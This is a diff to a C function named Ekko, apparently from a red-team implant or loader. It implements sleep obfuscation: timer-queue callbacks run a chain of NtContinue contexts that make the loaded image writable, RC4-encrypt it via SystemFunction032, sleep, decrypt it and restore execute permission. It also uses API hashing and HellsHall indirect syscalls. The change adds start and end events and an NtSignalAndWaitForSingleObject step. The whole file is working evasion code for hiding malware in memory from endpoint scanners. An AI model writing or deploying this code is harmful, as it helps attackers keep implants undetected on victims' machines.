@@ -32,10 +32,12 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     Instance.Win32.RtlCreateTimerQueue = LdrFunction (Instance.Modules.Ntdll, 0x50ef3c31);
     Instance.Win32.RtlCreateTimer = LdrFunction (Instance.Modules.Ntdll, 0x1877faec);
     Instance.Win32.RtlDeleteTimerQueueEx = LdrFunction (Instance.Modules.Ntdll, 0xa5467ded);
+    Instance.Win32.NtSignalAndWaitForSingleObject = LdrFunction (Instance.Modules.Ntdll, 0x78983aed);
 
     Instance.Win32.SystemFunction032 = LdrFunction (Instance.Modules.Cryptsp, 0xe58c8805);
 
     CONTEXT CtxThread   = { 0 };
+    CONTEXT RopStart    = { 0 };
     CONTEXT RopProtRW   = { 0 };
     CONTEXT RopMemEnc   = { 0 };
     CONTEXT RopDelay    = { 0 };
@@ -45,7 +47,9 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 
     HANDLE  hTimerQueue = NULL;
     HANDLE  hNewTimer   = NULL;
-    HANDLE  hEvent      = NULL;
+    HANDLE  EventTimer  = { 0 };
+    HANDLE  EventStart  = { 0 };
+    HANDLE  EventEnd    = { 0 };
     PVOID   ImageBase   = NULL;
     DWORD   ImageSize   = 0;
     DWORD   OldProtect  = 0x6969;
@@ -59,7 +63,15 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     PVOID   NtContinue  = NULL;
     PVOID   SysFunc032  = NULL;
      
-    Instance.Win32.NtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, 0, 0 ); //For 4th arg, NotificationEvent = 0
+    // For 4th arg, NotificationEvent = 0
+    // PUtting && here somehow made only the first event create
+    if ( Instance.Win32.NtCreateEvent( &EventStart, EVENT_ALL_ACCESS, NULL, 0, 0 ) != 0 ||
+         Instance.Win32.NtCreateEvent( &EventEnd, EVENT_ALL_ACCESS, NULL, 0, 0 )   != 0 ||
+         Instance.Win32.NtCreateEvent( &EventTimer, EVENT_ALL_ACCESS, NULL, 0, 0 ) != 0 )
+    {
+        Instance.Win32.printf( "[ERROR] Failed to create events" );
+        return;
+    }
     Instance.Win32.RtlCreateTimerQueue( &hTimerQueue) ; // https://doxygen.reactos.org/d8/dd5/ndk_2rtlfuncs_8h.html#a3c33cfe4a773cc54ead6d284427bc12c
 
 #if defined  ISEXE || defined  ISDLL
@@ -81,21 +93,24 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     Img.Buffer  = ImageBase;
     Img.Length  = Img.MaximumLength = ImageSize;
     
-    
     // https://doxygen.reactos.org/df/d53/dll_2win32_2kernel32_2client_2timerqueue_8c.html#a1a76d5f2b6b93fd0dbfe0571cd03effd
-    if ( Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) == 0)
+    if ( Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.RtlCaptureContext, &CtxThread, 100, 0, WT_EXECUTEINTIMERTHREAD ) == 0  &&
+         Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtSetEvent, EventTimer, 200, 0, WT_EXECUTEINTIMERTHREAD ) == 0)
     { 
         LARGE_INTEGER li = { 0 };
-        li.QuadPart    = (long)-1000000L * ( (long)5 ); //-10000000L = 1 second, so this should be 50 miliseconds
-        Instance.Win32.NtWaitForSingleObject( hEvent, 0, &li );
+        li.QuadPart    = (long)-1000000L * ( (long)2 ); //-10000000L = 1 second
+        Instance.Win32.printf("[Info] Waiting up to .2 second for timer to trigger\n");
+        Instance.Win32.NtWaitForSingleObject( EventTimer, 0, &li );
 
+        // VX-API OP
+        CopyMemoryEx( &RopStart,  &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
         CopyMemoryEx( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
-    
+
         /* Using HellsHall to allocate memory for the stub to be copied*/
         MyStruct    S           = { 0 };
         NTDLL       NtdllSt     = { 0 };
@@ -129,6 +144,17 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         StubSize = (int)GetRIPE - (int)ProtStub; 
         Instance.Win32.printf( "[Info] Stub is mapped at 0x%llx\n", CopiedProtStub);
 
+
+        /* Now we set up the contexts that will be fed to the timers */
+
+        // NtWaitForSingleObject( EventTimer, 0, NULL )
+        RopStart.Rsp   -= 8;
+        RopStart.Rip   = Instance.Win32.NtWaitForSingleObject;
+        RopStart.Rcx   = EventStart;
+        RopStart.Rdx   = 0;
+        RopStart.R8    = NULL;
+
+        /* Changing to RW */
         SIZE_T ProtectionRange = (SIZE_T)ImageSize; // Gotta love how size matters :(. 8 byte ptr to int != 8 byte ptr to 8 byte num
         SIZE_T ProtectionRange2 = (SIZE_T)ImageSize; // Declare 2 of these, one for each instance. Since ntprotect will change them up during rop
         ProtStubArgs ProtArgs = { 0 };
@@ -145,14 +171,12 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         RopProtRW.R11   = S.NtProtectVirtualMemory.pInst;
         
         // SystemFunction032( &Key, &Img );
-
         RopMemEnc.Rsp  -= 8;
         RopMemEnc.Rip   = Instance.Win32.SystemFunction032;
         RopMemEnc.Rcx   = &Img;
         RopMemEnc.Rdx   = &Key;
 
-        // NtWaitForSingleObject( hTargetHdl, BOOL alert?, PLARGE_INTEGER SleepTime );
-        
+        // NtWaitForSingleObject( hTargetHdl, BOOL alertable, PLARGE_INTEGER SleepTime );
         li.QuadPart    = (long)-10000000L * ((long)SleepTime / 1000 ); // -10000000L = 1 second, and our sleeptime is in milliseconds
         RopDelay.Rsp   -= 8;
         RopDelay.Rip    = Instance.Win32.NtWaitForSingleObject;
@@ -167,6 +191,7 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         RopMemDec.Rcx   = &Img;
         RopMemDec.Rdx   = &Key;
         
+        /* Changing to RX */
         ProtStubArgs ProtArgs2 = ProtArgs;
         ProtArgs2.Args[2] = &ProtectionRange2;
         ProtArgs2.Args[3] = PAGE_EXECUTE_READ;
@@ -179,21 +204,22 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
         // SetEvent( hEvent );
         RopSetEvt.Rsp  -= 8;
         RopSetEvt.Rip   = Instance.Win32.NtSetEvent;
-        RopSetEvt.Rcx   = hEvent;
+        RopSetEvt.Rcx   = EventEnd;
         RopSetEvt.Rdx   = NULL;
         
         Instance.Win32.printf( "[INFO] Queue timers\n" );
         
-        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
-        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopStart, 300, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRW, 400, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemEnc, 500, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopDelay,  600, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopMemDec, 700, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopProtRX, 800, 0, WT_EXECUTEINTIMERTHREAD );
+        Instance.Win32.RtlCreateTimer( hTimerQueue, &hNewTimer, Instance.Win32.NtContinue, &RopSetEvt, 900, 0, WT_EXECUTEINTIMERTHREAD );
 
-        Instance.Win32.printf( "[INFO] Wait for hEvent\n" );
+        Instance.Win32.printf( "[INFO] Wait for EventEnd\n" );
 
-        Instance.Win32.NtWaitForSingleObject( hEvent, 0, NULL );
+        Instance.Win32.NtSignalAndWaitForSingleObject( EventStart, EventEnd, 0, NULL );
 
         Instance.Win32.printf( "[INFO] Finished waiting for event\n" );
 
